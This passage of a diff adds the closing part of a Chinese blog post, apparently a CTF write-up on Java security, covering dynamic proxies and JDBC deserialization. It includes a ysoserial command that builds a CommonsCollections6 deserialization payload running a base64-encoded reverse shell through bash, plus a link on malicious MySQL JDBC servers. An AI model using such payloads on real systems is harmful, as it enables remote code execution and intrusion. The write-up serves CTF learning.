class_">String</span>(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));<br>        System.out.println(str);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用ysoserial生成反弹shell的CC链，JDBC恶意服务器可以看这篇文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7754#toc-0">小白看得懂的MySQL JDBC 反序列化漏洞分析</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-all.jar CommonsCollections6 <span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; a<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218172315694.png" srcset="/img/loading.gif" lazyload alt="image-20250218172315694"></p>
+<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250218172759801.png" srcset="/img/loading.gif" lazyload alt="image-20250218172759801"></p>
+<h2 id="坑点与总结-1"><a href="#坑点与总结-1" class="headerlink" title="坑点与总结"></a>坑点与总结</h2><p>坑点：做题时，类的包名要和题目jar中的包名一致，不然会导致反序列化找不到类失败。</p>
+<p>题目主要考察对<strong>动态代理</strong>的理解和<strong>JDBC反序列化</strong>，推荐观看组长对动态代理的讲解<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9?spm_id_from=333.788.videopod.episodes&vd_source=d195054a6a081ba07486dcc86c6ba707&p=3">Java反序列化漏洞专题-基础篇(21&#x2F;09&#x2F;05更新类加载部分)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/JAVA/" class="category-chain-item">JAVA</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" class="print-no-link">#JAVA安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从CTF学习JAVA安全</div>
+      <div>https://sp4rks3.github.io/2025/02/07/JAVA安全/漏洞复现/从CTF学习JAVA安全/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sp4rks3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/02/11/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">JNDI注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/14/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%94%BB%E5%87%BB%E7%AF%87/" title="JAVA反序列化-RMI攻击篇">
+                        <span class="hidden-mobile">JAVA反序列化-RMI攻击篇</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"Sp4rks3/Sp4rks3.github.io","repo-id":"R_kgDOL2R4Xw","category":"Announcements","category-id":"DIC_kwDOL2R4X84ChqtT","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
